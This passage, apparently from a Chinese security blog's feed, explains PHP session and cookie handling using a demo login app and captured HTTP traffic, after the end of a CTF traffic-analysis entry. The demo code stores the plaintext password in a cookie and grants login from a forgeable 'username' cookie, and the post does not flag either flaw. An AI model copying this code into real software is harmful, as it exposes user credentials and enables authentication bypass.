class="number">1783</span> Win=<span class="number">131072</span> Len=<span class="number">0</span> TSval=<span class="number">802150773</span> TSecr=<span class="number">4294962249</span></span><br><span class="line"><span class="number">80</span> → <span class="number">52564</span> [ACK] Seq=<span class="number">1783</span> Ack=<span class="number">362</span> Win=<span class="number">6912</span> Len=<span class="number">0</span> TSval=<span class="number">4294962249</span> TSecr=<span class="number">802150773</span></span><br><span class="line"><span class="number">52565</span> → <span class="number">80</span> [SYN, ECN, CWR] Seq=<span class="number">0</span> Win=<span class="number">65535</span> Len=<span class="number">0</span> MSS=<span class="number">1460</span> WS=<span class="number">32</span> TSval=<span class="number">802150779</span> TSecr=<span class="number">0</span> SACK_PERM=<span class="number">1</span></span><br><span class="line"><span class="number">80</span> → <span class="number">52565</span> [SYN, ACK, ECN] Seq=<span class="number">0</span> Ack=<span class="number">1</span> Win=<span class="number">5792</span> Len=<span class="number">0</span> MSS=<span class="number">1460</span> SACK_PERM=<span class="number">1</span> TSval=<span class="number">4294962251</span> TSecr=<span class="number">802150779</span> WS=<span class="number">64</span></span><br><span class="line"><span class="number">52565</span> → <span class="number">80</span> [ACK] Seq=<span class="number">1</span> Ack=<span class="number">1</span> Win=<span class="number">131744</span> Len=<span class="number">0</span> TSval=<span class="number">802150779</span> TSecr=<span class="number">4294962251</span></span><br><span class="line">GET /sqli/example2.php?name=000 HTTP/1.1 </span><br><span class="line"><span class="number">80</span> → <span class="number">52565</span> [ACK] Seq=<span class="number">1</span> Ack=<span class="number">361</span> Win=<span class="number">6912</span> Len=<span class="number">0</span> TSval=<span class="number">4294962251</span> TSecr=<span class="number">802150779</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK  [TCP segment of a reassembled PDU]</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK  (text/html)</span><br><span class="line"><span class="number">80</span> → <span class="number">52565</span> [FIN, ACK] Seq=<span class="number">1782</span> Ack=<span class="number">361</span> Win=<span class="number">6912</span> Len=<span class="number">0</span> TSval=<span class="number">4294962251</span> TSecr=<span class="number">802150779</span></span><br><span class="line"><span class="number">52565</span> → <span class="number">80</span> [ACK] Seq=<span class="number">361</span> Ack=<span class="number">1782</span> Win=<span class="number">129984</span> Len=<span class="number">0</span> TSval=<span class="number">802150781</span> TSecr=<span class="number">4294962251</span></span><br><span class="line"><span class="number">52565</span> → <span class="number">80</span> [ACK] Seq=<span class="number">361</span> Ack=<span class="number">1783</span> Win=<span class="number">131072</span> Len=<span class="number">0</span> TSval=<span class="number">802150781</span> TSecr=<span class="number">4294962251</span></span><br><span class="line"><span class="number">52565</span> → <span class="number">80</span> [FIN, ACK] Seq=<span class="number">361</span> Ack=<span class="number">1783</span> Win=<span class="number">131072</span> Len=<span class="number">0</span> TSval=<span class="number">802150781</span> TSecr=<span class="number">4294962251</span></span><br><span class="line"><span class="number">80</span> → <span class="number">52565</span> [ACK] Seq=<span class="number">1783</span> Ack=<span class="number">362</span> Win=<span class="number">6912</span> Len=<span class="number">0</span> TSval=<span class="number">4294962251</span> TSecr=<span class="number">802150781</span></span><br></pre></td></tr></table></figure><p>过滤表达式可以直接通过wireshark获取</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018102739490.png" alt="image-20201018102739490"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018102835747.png" alt="image-20201018102835747"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>session、cookie原理</title>
      <link href="2019/02/05/session%E3%80%81cookie%E5%8E%9F%E7%90%86/"/>
      <url>2019/02/05/session%E3%80%81cookie%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="session、cookie原理"><a href="#session、cookie原理" class="headerlink" title="session、cookie原理"></a>session、cookie原理</h1><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="登陆前"><a href="#登陆前" class="headerlink" title="登陆前"></a>登陆前</h3><p>session_start()</p><ul><li><p>用户第一次访问文件(含有session_start函数的文件)</p><p>用户第一次访问是没有PHPSESSID,所以会创建$_SESSION变量,同时创建sess_abc123的session文件,将abc123作为PHPSESSID的值返回给浏览器</p><p>比如:</p><p>我们在从未提交过表单,也就是没有访问login.php,因此session_start函数不会触发,PHPSESSID也不会存在</p><p>cookie中不会存在任何PHPSESSID值</p><p>没有访问服务器之前,我们的请求是不会带上PHPSESSID的</p></li><li><p>用户提交表单到服务器(login.php),此时无论是否密码、账号是否正确,都会出发session_start函数,进而生成PHPSESSID值</p><p>然后我们在每一个请求服务器的时候都会带上PHPSESSID</p></li></ul><h3 id="登陆后"><a href="#登陆后" class="headerlink" title="登陆后"></a>登陆后</h3><p>登陆之后,通过以下代码设置cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;username&quot;,$username,time()+7*24*60*60); </span><br><span class="line">setcookie(&quot;code&quot;,$password,time()+7*24*60*60); </span><br></pre></td></tr></table></figure><p>我们在前端可以使用js获取到cookie值</p><h3 id="HttpOnly设置"><a href="#HttpOnly设置" class="headerlink" title="HttpOnly设置"></a>HttpOnly设置</h3><p>每个<code>cookie</code>都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过<code>cookie</code>选项来设置的，<code>cookie</code>选项包括：<code>expires</code>、<code>domain</code>、<code>path</code>、<code>secure</code>、<code>HttpOnly</code>。在设置任一个<code>cookie</code>时都可以设置相关的这些属性，当然也可以不设置，这时会使用这些属性的默认值。在设置这些属性时，属性之间由一个**<code>分号</code><strong>和一个</strong><code>空格</code>**隔开。</p><p>这个选项用来设置<code>cookie</code>是否能通过 <code>js</code> 去访问。默认情况下，<code>cookie</code>不会带<code>httpOnly</code>选项(即为空)，所以默认情况下，客户端是可以通过<code>js</code>代码去访问（包括读取、修改、删除等）这个<code>cookie</code>的。当<code>cookie</code>带<code>httpOnly</code>选项时，客户端则无法通过<code>js</code>代码去访问（包括读取、修改、删除等）这个<code>cookie</code>。</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h4><p>只有设置了<code>setcookie</code>的第七个参数为<code>true</code>的时候 <code>document.cookie</code>才是空的,即使在<code>php.ini</code>里面设置了<code>session.cookie_httponly=On</code>并且设置了<code>session.cookie_httponly </code>这个属性<code>(ini_set(&quot;session.cookie_httponly&quot;, 1);)</code>，但是在浏览器还是能获取到<code>cookie</code>的信息,只要<code>setcookie</code>的第七个参数不设置为<code>true</code>,<code>document.cookie</code>依然能取到值。</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>login.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; xml:lang&#x3D;&quot;en&quot;&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line"> &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;&#x2F;&gt; </span><br><span class="line"> &lt;title&gt;会员登录&lt;&#x2F;title&gt; </span><br><span class="line"> &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt; </span><br><span class="line">  ul li&#123;margin:0;padding:0;&#125; </span><br><span class="line">  form&#123;margin:40px 30px 0;&#125; </span><br><span class="line">  form li&#123;list-style:none;padding:5px 0;&#125; </span><br><span class="line">  form li label&#123;float:left;width:70px;text-align:right&#125; </span><br><span class="line">  form li a&#123;font-size:12px;color:#999;text-decoration:none&#125; </span><br><span class="line">  .login_btn&#123;border:none;background:#01A4F1;color:#fff;font-size:14px;font-weight:bold;height:28px;line-height:28px;padding:0 10px;cursor:pointer;&#125; </span><br><span class="line">  form li img&#123;vertical-align:top&#125; </span><br><span class="line"> &lt;&#x2F;style&gt; </span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt; </span><br><span class="line"> &lt;fieldset&gt; </span><br><span class="line">  &lt;legend&gt;用户登录&lt;&#x2F;legend&gt; </span><br><span class="line">  &lt;ul&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt;用户名:&lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt;密码:&lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;remember&quot; value&#x3D;&quot;yes&quot;&#x2F;&gt;7天内自动登录 </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;login&quot; value&#x3D;&quot;登录&quot; class&#x3D;&quot;login_btn&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">  &lt;&#x2F;ul&gt; </span><br><span class="line"> &lt;&#x2F;fieldset&gt; </span><br><span class="line">&lt;&#x2F;body&gt; </span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;); </span><br><span class="line"> session_start(); </span><br><span class="line"> if(isset($_POST[&#39;login&#39;])) </span><br><span class="line"> &#123; </span><br><span class="line">  $username &#x3D; trim($_POST[&#39;username&#39;]); </span><br><span class="line">  $password &#x3D; trim($_POST[&#39;password&#39;]); </span><br><span class="line">  if(($username&#x3D;&#x3D;&#39;&#39;)||($password&#x3D;&#x3D;&#39;&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;login.html&#39;); </span><br><span class="line">   echo &quot;改用户名或密码不能为空，3秒后跳转到登录页面&quot;; </span><br><span class="line">   exit; </span><br><span class="line">  &#125; </span><br><span class="line">  else if(($username!&#x3D;&#39;username&#39;)||($password!&#x3D;&#39;password&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   &#x2F;&#x2F;用户名或密码错误 </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;login.html&#39;); </span><br><span class="line">   echo &quot;用户名或密码错误，3秒后跳转到登录页面&quot;; </span><br><span class="line">   exit; </span><br><span class="line">  &#125; </span><br><span class="line">  else if(($username&#x3D;&#x3D;&#39;username&#39;)&amp;&amp;($password&#x3D;&#x3D;&#39;password&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   &#x2F;&#x2F;登录成功将信息保存到session中 </span><br><span class="line">   $_SESSION[&#39;username&#39;]&#x3D;$username; </span><br><span class="line">   $_SESSION[&#39;islogin&#39;]&#x3D;1; </span><br><span class="line">   &#x2F;&#x2F;如果勾选7天内自动保存，则将其保存到cookie </span><br><span class="line">   if($_POST[&#39;remember&#39;]&#x3D;&#x3D;&quot;yes&quot;) </span><br><span class="line">   &#123; </span><br><span class="line">    setcookie(&quot;username&quot;,$username,time()+7*24*60*60); </span><br><span class="line">    setcookie(&quot;code&quot;,$password,time()+7*24*60*60); </span><br><span class="line">   &#125; </span><br><span class="line">   else </span><br><span class="line">   &#123; </span><br><span class="line">    setcookie(&quot;username&quot;,&#39;&#39;,time()-1); </span><br><span class="line">    setcookie(&quot;code&quot;,&#39;&#39;,time()-1); </span><br><span class="line">   &#125; </span><br><span class="line">   &#x2F;&#x2F;跳转到用户首页 </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;index.php&#39;); </span><br><span class="line">  &#125; </span><br><span class="line"> &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"> session_start(); </span><br><span class="line"> <span class="comment">//首先判断Cookie是否有记住用户信息 </span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;username&#x27;</span>])) </span><br><span class="line"> &#123; </span><br><span class="line">  $_SESSION[<span class="string">&#x27;username&#x27;</span>]=$_COOKIE[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line">  $_SESSION[<span class="string">&#x27;islogin&#x27;</span>]=<span class="number">1</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;islogin&#x27;</span>])) </span><br><span class="line"> &#123; </span><br><span class="line">  <span class="comment">//已经登录 </span></span><br><span class="line">  <span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;:你好，欢迎进入个人中心！&lt;br/&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;logout.php&#x27;&gt;注销&lt;/a&gt;&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line"> &#123; <span class="comment">//为登录 </span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;你还未登录，请&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>Logout.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"> session_start(); </span><br><span class="line"> <span class="comment">//清除session </span></span><br><span class="line"> $username=$_SESSION[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line"> $_SESSION=<span class="keyword">array</span>(); </span><br><span class="line"> session_destroy(); </span><br><span class="line"> <span class="comment">//清除cookie </span></span><br><span class="line"> setcookie(<span class="string">&quot;username&quot;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-1</span>); </span><br><span class="line"> setcookie(<span class="string">&quot;code&quot;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-1</span>); </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$username</span>,欢迎下次光临&quot;</span>; </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;重新&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h2 id="第一次请求-不记住我"><a href="#第一次请求-不记住我" class="headerlink" title="第一次请求(不记住我)"></a>第一次请求(不记住我)</h2><h3 id="请求包"><a href="#请求包" class="headerlink" title="请求包"></a>请求包</h3><p>没有携带任何的cookie信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/login.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">82.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">82.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 60</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1:8888</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8888/upload/login.html</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">username=username&amp;password=password&amp;login=%E7%99%BB%E5%BD%95</span></span><br></pre></td></tr></table></figure><h3 id="响应包"><a href="#响应包" class="headerlink" title="响应包"></a>响应包</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Thu, <span class="number">19</span> Nov <span class="number">2020</span> <span class="number">06</span>:<span class="number">25</span>:<span class="number">52</span> GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.6</span><span class="number">.40</span></span><br><span class="line">Set-Cookie: PHPSESSID=<span class="number">4</span>ac995bf20318bd2e6e30fc39f443db7; path=/</span><br><span class="line">Expires: Thu, <span class="number">19</span> Nov <span class="number">1981</span> <span class="number">08</span>:<span class="number">52</span>:<span class="number">00</span> GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=<span class="number">0</span>, pre-check=<span class="number">0</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Set-Cookie: username=deleted; expires=Thu, <span class="number">01</span>-Jan<span class="number">-1970</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span> GMT; Max-Age=<span class="number">0</span></span><br><span class="line">Set-Cookie: code=deleted; expires=Thu, <span class="number">01</span>-Jan<span class="number">-1970</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span> GMT; Max-Age=<span class="number">0</span></span><br><span class="line">refresh: <span class="number">3</span>;url=index.php</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html;charset=utf<span class="number">-8</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看到返回一个phpsessionid给服务端。</p><p>对应源码中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;username&#x27;</span>]=$username; </span><br><span class="line">$_SESSION[<span class="string">&#x27;islogin&#x27;</span>]=<span class="number">1</span>; </span><br></pre></td></tr></table></figure><p>而且可以看到由于我们没有选择记住我功能，cookie的有效时间几乎不存在。对应源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;username&quot;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-1</span>); </span><br><span class="line">setcookie(<span class="string">&quot;code&quot;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-1</span>); </span><br></pre></td></tr></table></figure><p>成功登录之后再一次访问，可以看到请求头带上了sessionid，但是并没有带上有关用户信息的cookie，因为我们设置了cookie有效时间为0。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">82.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">82.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=509db33ae5e271f27d4cfa29e3071499</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure><h2 id="第二次请求-记住我功能"><a href="#第二次请求-记住我功能" class="headerlink" title="第二次请求(记住我功能)"></a>第二次请求(记住我功能)</h2><h3 id="请求包-1"><a href="#请求包-1" class="headerlink" title="请求包"></a>请求包</h3><p>同理第一次访问没有sessionid。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/login.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">82.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">82.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 73</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1:8888</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8888/upload/login.html</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">username=username&amp;password=password&amp;remember=yes&amp;login=%E7%99%BB%E5%BD%95</span></span><br></pre></td></tr></table></figure><h3 id="响应包-1"><a href="#响应包-1" class="headerlink" title="响应包"></a>响应包</h3><p>返回sessionid，并且cookie的有效性设置为7天。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Thu, <span class="number">19</span> Nov <span class="number">2020</span> <span class="number">06</span>:<span class="number">39</span>:<span class="number">02</span> GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.6</span><span class="number">.40</span></span><br><span class="line">Set-Cookie: PHPSESSID=<span class="number">059286111</span>d278a766e78d25a7acb2aa6; path=/</span><br><span class="line">Expires: Thu, <span class="number">19</span> Nov <span class="number">1981</span> <span class="number">08</span>:<span class="number">52</span>:<span class="number">00</span> GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=<span class="number">0</span>, pre-check=<span class="number">0</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Set-Cookie: username=username; expires=Thu, <span class="number">26</span>-Nov<span class="number">-2020</span> <span class="number">06</span>:<span class="number">39</span>:<span class="number">02</span> GMT; Max-Age=<span class="number">604800</span></span><br><span class="line">Set-Cookie: code=password; expires=Thu, <span class="number">26</span>-Nov<span class="number">-2020</span> <span class="number">06</span>:<span class="number">39</span>:<span class="number">02</span> GMT; Max-Age=<span class="number">604800</span></span><br><span class="line">refresh: <span class="number">3</span>;url=index.php</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html;charset=utf<span class="number">-8</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br></pre></td></tr></table></figure><p>登录成功之后再次访问该页面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">82.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">82.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: username=username; code=password; PHPSESSID=6a8a5ebf3eb4438284167ed3a98d17b5</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 